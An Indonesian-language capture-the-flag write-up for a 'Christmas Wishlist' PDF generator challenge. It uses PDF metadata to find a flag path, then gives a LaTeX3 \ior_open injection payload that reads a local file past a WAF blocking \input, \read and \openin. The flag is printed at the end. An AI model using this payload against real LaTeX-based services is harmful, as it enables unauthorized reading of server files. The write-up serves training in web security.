
# Xmas Wishlist

Mengungkap rahasia di balik generator PDF Natal dengan teknik *Metadata Forensics* dan *Modern LaTeX3 Injection* untuk mem-bypass WAF.

## The Scenario

Kami diberikan akses ke aplikasi web "Christmas Wishlist" yang mengizinkan pengguna untuk membuat daftar keinginan Natal mereka dan mengunduhnya sebagai PDF. Di balik layar, input pengguna diproses oleh engine LaTeX untuk men-generate dokumen.

Tujuan kami adalah mendapatkan flag, namun kami tidak tahu di mana flag tersebut disimpan, dan server menerapkan filter ketat (WAF) terhadap perintah-perintah berbahaya standar.

## Reconnaissance

Langkah pertama adalah mencari tahu lokasi target (flag). Kami menganalisis file sampel PDF (`sample_wishlist.pdf`) yang dihasilkan oleh aplikasi untuk melihat apakah ada informasi yang bocor.

Kami menggunakan tool **ExifTool** untuk memeriksa metadata dokumen tersebut.

```bash
exiftool sample_wishlist.pdf

```

Dari hasil analisis metadata, kami menemukan *path* file yang mencurigakan tertinggal pada field `Subject` (atau field custom metadata lainnya):

```text
ExifTool Version Number         : 12.40
File Name                       : sample_wishlist.pdf
File Type                       : PDF
PDF Version                     : 1.5
Title                           : My Wishlist
Subject                         : Template source: /app/xmas_wishlist_secret_flag.txt
Creator                         : LaTeX with hyperref
Producer                        : pdfTeX

```

Informasi ini mengonfirmasi target lokasi file kita: `/app/xmas_wishlist_secret_flag.txt`.

## WAF Bypass & Exploitation

Setelah mengetahui lokasi target, kami mencoba melakukan *Local File Inclusion* (LFI). Percobaan menggunakan perintah standar TeX seperti `\input`, `\read`, atau `\openin` gagal karena diblokir oleh WAF ("Blacklisted command detected").

Untuk melewati filter ini, kami memanfaatkan fitur **LaTeX3** (package `expl3` atau `L3 programming layer`). Sintaks LaTeX3 menggunakan penamaan fungsi yang sangat berbeda (banyak menggunakan `_` dan `:`) yang seringkali tidak dikenali oleh rule WAF tradisional yang hanya mencari keyword seperti "input" atau "read".

### The Payload

Kami menyusun payload menggunakan modul `ior` (Input/Output Stream) dari LaTeX3 untuk membaca file baris per baris:

```latex
\ExplSyntaxOn
% Membuat stream input baru (variabel global)
\ior_new:N \g_flag_stream

% Membuka file target yang ditemukan dari metadata
\ior_open:Nn \g_flag_stream { /app/xmas_wishlist_secret_flag.txt }

% Membaca stream baris per baris dan mencetaknya ke dokumen
\ior_str_map_inline:Nn \g_flag_stream { #1 \par }

% Menutup stream
\ior_close:N \g_flag_stream
\ExplSyntaxOff

```

**Penjelasan Payload:**

1. `\ExplSyntaxOn`: Mengaktifkan sintaks eksperimental LaTeX3.
2. `\ior_new:N`: Mendeklarasikan pointer stream baru.
3. `\ior_open:Nn`: Membuka file target. Sintaks ini lolos dari filter karena tidak mengandung string "openin" atau "input".
4. `\ior_str_map_inline:Nn`: Melakukan iterasi (loop) pada setiap baris dalam file dan mencetaknya (`#1`) diikuti baris baru (`\par`).

## The Verdict

Strategi ini berhasil. WAF server tidak memiliki aturan untuk memblokir sintaks `\ior_...` dari LaTeX3. PDF yang dihasilkan berhasil merender isi dari file rahasia tersebut.

> TBF1{All˙I˙W4nt˙F0r˙Chr1stm4s˙Is˙LFI˝ }
